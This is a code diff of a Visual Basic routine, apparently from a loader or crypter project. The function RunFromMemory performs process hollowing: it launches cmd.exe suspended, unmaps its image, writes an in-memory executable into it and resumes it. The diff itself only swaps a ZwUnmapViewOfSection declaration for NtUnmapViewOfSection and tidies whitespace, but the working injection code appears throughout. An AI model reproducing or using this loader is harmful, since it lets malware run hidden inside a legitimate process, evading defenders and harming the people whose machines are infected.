@@ -58,7 +58,7 @@ Private Declare Function ResumeThread Lib "kernel32" (ByVal hThread As Long) As 
 ' Process creation and memory access stuff
 '
 Private Declare Function CreateProcess Lib "kernel32" Alias "CreateProcessA" (ByVal lpAppName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As Long, ByVal lpThreadAttributes As Long, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As Long, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESSINFO) As Long
-Private Declare Function ZwUnmapViewOfSection Lib "ntdll.dll" (ByVal hProcess As Long, ByVal BaseAddress As Long) As Long
+Private Declare Function NtUnmapViewOfSection Lib "ntdll.dll" (ByVal hProcess As Long, ByVal lpBaseAddress As Long) As Long
 Private Declare Function WriteProcessMemory Lib "kernel32" (ByVal hProcess As Long, lpBaseAddress As Any, lpBuffer As Any, ByVal nSize As Long, lpNumberOfBytesWritten As Long) As Long
 Private Declare Function ReadProcessMemory Lib "kernel32" (ByVal hProcess As Long, lpBaseAddress As Any, lpBuffer As Any, ByVal nSize As Long, lpNumberOfBytesWritten As Long) As Long
 Private Declare Function VirtualAllocEx Lib "kernel32" (ByVal hProcess As Long, ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
@@ -215,40 +215,40 @@ Function RunFromMemory(abExeFile() As Byte, si As STARTUPINFO, pi As PROCESSINFO
     Dim context As CONTEXT86
     Dim ImageBase As Long, ret As Long, i As Long
     Dim Addr As Long, lOffset As Long
-           
+
     CopyMemory idh, abExeFile(0), Len(idh)
     If idh.e_magic <> IMAGE_DOS_SIGNATURE Then
         RunFromMemory = 0&
         Exit Function
     End If
-    
+
     CopyMemory inh, abExeFile(idh.e_lfanew), Len(inh)
     If inh.Signature <> IMAGE_NT_SIGNATURE Then
         RunFromMemory = 0&
         Exit Function
     End If
-    
+
     If CreateProcess(vbNullString, "cmd.exe " & Arguments, 0, 0, InheritHandles, CREATE_SUSPENDED Or CreationFlags, EnvironmentVariables, CurrentDir, si, pi) = 0 Then
         RunFromMemory = 0&
         Exit Function
     End If
-    
+
     context.ContextFlags = CONTEXT86_FULL
     If GetThreadContext(pi.hThread, context) = 0 Then GoTo ClearProcess
-       
+
     ReadProcessMemory pi.hProcess, ByVal context.Ebx + 8, Addr, 4, 0
     If Addr = inh.OptionalHeader.ImageBase Then
-        ZwUnmapViewOfSection pi.hProcess, Addr
+        NtUnmapViewOfSection pi.hProcess, Addr
     End If
-    
+
     ImageBase = VirtualAllocEx(pi.hProcess, inh.OptionalHeader.ImageBase, inh.OptionalHeader.SizeOfImage, MEM_RESERVE Or MEM_COMMIT, PAGE_EXECUTE_READWRITE)
     If ImageBase = 0 Then
         ImageBase = VirtualAllocEx(pi.hProcess, 0&, inh.OptionalHeader.SizeOfImage, MEM_RESERVE Or MEM_COMMIT, PAGE_EXECUTE_READWRITE)
         If ImageBase = 0 Then GoTo ClearProcess
     End If
-    
+
     WriteProcessMemory pi.hProcess, ByVal ImageBase, abExeFile(0), inh.OptionalHeader.SizeOfHeaders, 0&
-    
+
     lOffset = idh.e_lfanew + Len(inh)
     For i = 0 To inh.FileHeader.NumberOfSections - 1
         CopyMemory ish, abExeFile(lOffset + i * Len(ish)), Len(ish)
@@ -260,10 +260,10 @@ Function RunFromMemory(abExeFile() As Byte, si As STARTUPINFO, pi As PROCESSINFO
 
     SetThreadContext pi.hThread, context
     ResumeThread pi.hThread
-    
+
     RunFromMemory = 1&
     Exit Function
-    
+
 ClearProcess:
     TerminateProcess pi.hProcess, 0&
     CloseHandle pi.hThread
